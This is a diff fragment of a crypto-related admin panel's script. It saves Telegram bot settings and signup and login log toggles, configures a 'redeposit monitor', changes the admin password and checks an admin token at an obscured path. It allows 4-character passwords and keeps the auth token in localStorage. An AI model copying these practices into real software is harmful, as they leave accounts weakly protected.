+            } catch (error) {
+                showErrorNotification('Error: ' + error.message);
+            }
+        }
+
+        async function saveTelegramSettings() {
+            const newConfig = {
+                telegramNotificationsEnabled: document.getElementById('telegramNotificationsToggle').classList.contains('active'),
+                telegramBotToken: document.getElementById('telegramBotToken').value.trim(),
+                telegramChatId: document.getElementById('telegramChatId').value.trim()
+            };
+            if (await saveServerConfig(newConfig)) showNotification('Telegram settings saved!');
+            else showErrorNotification('Failed to save Telegram settings');
+        }
+
+        async function saveAuthLogSettings() {
+            const newConfig = {
+                telegramSignupLogsEnabled: document.getElementById('telegramSignupLogsToggle').classList.contains('active'),
+                telegramLoginLogsEnabled: document.getElementById('telegramLoginLogsToggle').classList.contains('active')
+            };
+            if (await saveServerConfig(newConfig)) showNotification('Auth log settings saved!');
+            else showErrorNotification('Failed to save auth log settings');
+        }
+
+        async function saveRedepositSettings() {
+            const intervalVal = parseInt(document.getElementById('redepositIntervalMinutes').value) || 60;
+            const clampedInterval = Math.min(999999, Math.max(3, intervalVal));
+            document.getElementById('redepositIntervalMinutes').value = clampedInterval;
+            const newConfig = {
+                redepositMonitorEnabled: document.getElementById('redepositMonitorToggle').classList.contains('active'),
+                redepositMonitorIntervalMinutes: clampedInterval
+            };
+            if (await saveServerConfig(newConfig)) {
+                showNotification('Redeposit monitor settings saved!');
+            } else {
+                showErrorNotification('Failed to save redeposit settings');
+            }
+        }
+
+        async function loadRedepositStatus() {
+            const statusEl = document.getElementById('redepositStatusLine');
+            if (!statusEl) return;
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const res = await fetch('/api/redeposit-monitor-status', { headers: { 'Authorization': `Bearer ${token}` } });
+                if (!res.ok) return;
+                const data = await res.json();
+                if (data.enabled && data.nextCheck) {
+                    statusEl.textContent = 'Next check: ' + new Date(data.nextCheck).toLocaleString();
+                } else if (data.enabled) {
+                    statusEl.textContent = 'Monitor active';
+                } else {
+                    statusEl.textContent = 'Monitor off';
+                }
+            } catch (e) { /* ignore */ }
+        }
+
+        async function changePassword() {
+            const currentPassword = document.getElementById('currentPassword').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            if (!currentPassword || !newPassword || !confirmPassword) { showErrorNotification('All password fields are required'); return; }
+            if (newPassword !== confirmPassword) { showErrorNotification('New passwords do not match'); return; }
+            if (newPassword.length < 4) { showErrorNotification('Password must be at least 4 characters'); return; }
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/change-password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+                    body: JSON.stringify({ currentPassword, newPassword, confirmPassword })
+                });
+                const result = await response.json();
+                if (result.success) {
+                    showNotification('Password changed successfully!');
+                    document.getElementById('currentPassword').value = '';
+                    document.getElementById('newPassword').value = '';
+                    document.getElementById('confirmPassword').value = '';
+                } else showErrorNotification(result.error || 'Failed to change password');
+            } catch (error) { showErrorNotification('Error changing password: ' + error.message); }
+        }
+
+        function logout() {
+            localStorage.removeItem('adminAuth');
+            window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login';
+        }
+
+        const token = localStorage.getItem('adminAuth');
+        if (!token) {
+            window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login';
+        } else {
+            fetch('/api/verify-admin', { headers: { 'Authorization': `Bearer ${token}` } })
+            .then(res => {
+                if (!res.ok) window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login';
+                else { loadServerInfo(); loadData(); fetchTickerPrices(); }
+            })
+            .catch(() => { window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login'; });
+        }
+
+        async function fetchTickerPrices() {
+            try {
+                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana,binancecoin&vs_currencies=usd');
+                const data = await res.json();
+                if (data.solana && data.solana.usd) {
+                    document.getElementById('tickerSolPrice').textContent = '$' + Number(data.solana.usd).toFixed(2);
+                }
+                if (data.binancecoin && data.binancecoin.usd) {
+                    document.getElementById('tickerBnbPrice').textContent = '$' + Number(data.binancecoin.usd).toFixed(2);
+                }
+            } catch (e) { console.error('Ticker price fetch error:', e); }
+        }
+        setInterval(fetchTickerPrices, 60000);
+    </script>
+</body>
+</html>
